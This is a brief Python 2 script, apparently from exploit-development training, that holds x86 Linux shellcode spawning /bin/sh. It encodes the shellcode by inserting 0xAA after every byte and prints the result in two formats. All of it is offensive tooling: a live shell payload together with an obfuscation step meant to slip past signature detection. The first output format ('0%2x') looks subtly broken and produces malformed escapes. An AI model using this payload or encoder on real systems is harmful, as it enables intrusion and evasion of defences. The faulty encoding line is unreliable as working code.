#!/usr/bin/python


# Python Insertion Encoder

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


encoded = ""
encoded2 = ""


print "[*] Encoded Shellcode..."


for byte in bytearray(shellcode):
	encoded += "\\x"
	encoded += "0%2x" % byte
	encoded += "\\x%02x" % 0xAA			# where the insertion happens, adding 0xAA to every byte in between

	encoded2 += "0x"
	encoded2 += "%02x," % byte
	encoded2 += "0x%02x," % 0xAA


print encoded

print encoded2

print "[*] Length: %d" % len(bytearray(shellcode))
